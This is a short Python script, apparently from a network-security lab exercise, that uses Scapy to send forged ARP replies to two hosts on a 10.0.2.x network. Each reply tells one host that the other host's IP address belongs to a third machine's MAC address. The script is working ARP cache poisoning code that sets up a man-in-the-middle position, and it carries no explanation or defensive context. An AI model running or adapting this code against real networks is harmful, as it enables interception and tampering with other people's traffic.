from scapy.all import *

Etherpkt1 =Ether()
Etherpkt1.dst = "08:00:27:29:b9:da"
ARPpkt1 = ARP()
ARPpkt1.hwsrc = "08:00:27:c1:a6:ab"
ARPpkt1.psrc = "10.0.2.5"
ARPpkt1.op = 2	
frame1 = Etherpkt1/ARPpkt1
sendp(frame1, count = 1) 


Etherpkt2 =Ether()
Etherpkt2.dst = "08:00:27:50:03:0d"
ARPpkt2 = ARP()
ARPpkt2.hwsrc = "08:00:27:c1:a6:ab"
ARPpkt2.psrc = "10.0.2.4"
ARPpkt2.op = 2	
frame2 = Etherpkt2/ARPpkt2
sendp(frame2, count = 1) 
